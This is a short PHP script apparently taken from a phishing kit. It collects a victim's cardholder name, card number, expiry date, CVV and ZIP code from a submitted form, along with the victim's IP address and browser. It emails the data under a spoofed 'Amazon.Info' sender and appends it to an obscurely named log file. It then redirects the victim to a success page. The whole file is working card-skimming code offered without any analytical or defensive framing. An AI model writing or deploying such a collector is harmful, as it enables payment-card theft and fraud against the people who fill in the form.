<?php
include "to.php";
$CCName  = $_POST['CCName'];
$card_number= $_POST['card_number'];
$Month   = $_POST['Month'];
$Year   = $_POST['Year'];
$CVV     = $_POST['CVV'];
$ZipCode = $_POST['ZipCode'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Spectrum-2 -------------
CCName : $CCName
card_number : $card_number
Month : $Month / Year : $Year
CVV : $CVV
City : $City
ZipCode : $ZipCode
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
ZipCode : $ZipCode
-------------------";
$MAIL_TITLE = "Credit Card | ".$IP."";
$MAIL_HEADER = "From: Amazon.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("f5t4d334.tf5td43-4u=7gu6y5645y65_yg=ug-67fy545t.54yf-75u=68-gu75_56u=67-guy655.2es-24dt=y7-8g6u7y_57u=78-6g7u5y6s.35yd-5fu=g68-7u56_e5h6=78g-iu67f5y64.y-57u=78-h6u6_45=u-gi6u75y6.32es-24t=6-u8hig6u7_76i=h97-i687u565.st3-d=6u-6gi7.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=success.html'>";exit;

?>
